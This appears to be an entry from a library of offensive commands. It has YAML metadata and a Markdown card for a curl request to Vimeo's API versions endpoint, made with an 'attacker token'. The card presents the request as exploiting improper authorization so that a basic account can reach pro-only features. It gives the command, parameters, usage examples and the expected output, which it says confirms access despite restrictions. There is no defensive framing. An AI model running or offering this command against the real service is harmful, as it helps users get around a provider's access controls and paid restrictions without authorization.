---
data: >-
  curl -H "Authorization: bearer YOUR_ATTACKER_TOKEN"
  https://api.vimeo.com/videos/VIDEO_ID/versions
tags:
  - api-query
type: command
output: JSON response with video versions array
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a14765b7-ebf9-4c90-b057-b82ff28e1a9a
created_at: '2025-12-14T17:32:39.446Z'
updated_at: '2025-12-14T17:32:39.446Z'
verified: false
validated: true
submitted: true
---
# curl-access-versions-endpoint

## Command

```bash
curl -H "Authorization: bearer YOUR_ATTACKER_TOKEN" https://api.vimeo.com/videos/VIDEO_ID/versions
```

## Description

Queries Vimeo's API versions endpoint to retrieve video version data, exploiting improper auth to access pro-only features with a basic account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: bearer TOKEN"` | API token for authentication | Yes |
| `VIDEO_ID` | Target video identifier | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: bearer abc123" https://api.vimeo.com/videos/123456/versions
```

### Advanced Usage

```bash
curl -H "Authorization: bearer abc123" -v https://api.vimeo.com/videos/123456/versions
```

## Expected Output

Successful response: {"data": [{"id": "version1", "created_time": "..."}]}. Indicates access granted despite account restrictions.

## Related

- [[Related Procedure]]
